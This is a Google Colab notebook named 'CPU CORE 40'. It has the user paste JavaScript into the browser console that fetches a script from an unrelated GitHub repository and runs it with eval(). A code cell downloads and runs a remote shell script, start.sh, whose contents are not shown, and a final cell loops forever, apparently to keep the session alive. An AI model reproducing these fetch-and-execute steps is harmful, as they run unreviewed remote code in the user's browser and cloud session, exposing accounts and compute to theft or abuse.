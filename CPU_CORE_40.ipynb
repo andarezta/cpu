{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "CPU CORE 40",
      "private_outputs": true,
      "provenance": [],
      "machine_shape": "hm",
      "authorship_tag": "ABX9TyMc7bBktk+HOoo6G1e7Y3Oj",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/kopen1/cpu/blob/main/CPU_CORE_40.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# config Console\n",
        " <br>\n",
        " ** CTRL + SHIFT + K **\n",
        "\n",
        " <hr>\n",
        "\n",
        "\n",
        "async function mode() {\n",
        "let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'\n",
        "let response = await fetch(url);\n",
        "let script = await response.text();\n",
        "eval(script);}\n",
        "mode();\n",
        "<br>\n",
        "<hr>"
      ],
      "metadata": {
        "id": "bu-YYSsEVhSK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title CPU CORE 40\n",
        "!lscpu\n",
        "!cd \n",
        "!wget https://raw.githubusercontent.com/kopen1/cpu/main/start.sh && sh start.sh\n"
      ],
      "metadata": {
        "cellView": "form",
        "id": "smBVcsBEVGoo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Time Execution \n",
        "import time \n",
        "from IPython.display import clear_output \n",
        " \n",
        "def zero_to_infinity(): \n",
        "    i = 0 \n",
        "    while True: \n",
        "        yield i \n",
        "        i += 1 \n",
        "        time.sleep(1) \n",
        " \n",
        "start = time.time() \n",
        "for x in zero_to_infinity(): \n",
        "    clear_output(wait=True) \n",
        "    end = time.time() \n",
        "    temp = end-start \n",
        "    hours = temp//3600 \n",
        "    temp = temp - 3600*hours \n",
        "    minutes = temp//60 \n",
        "    seconds = temp - 60*minutes \n",
        "    print(\"\") \n",
        "    print('%s %d:%d:%d' %(\"Time execution : \",hours,minutes,seconds)) \n",
        "    print(\"\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "BYBuWTNNVG95"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
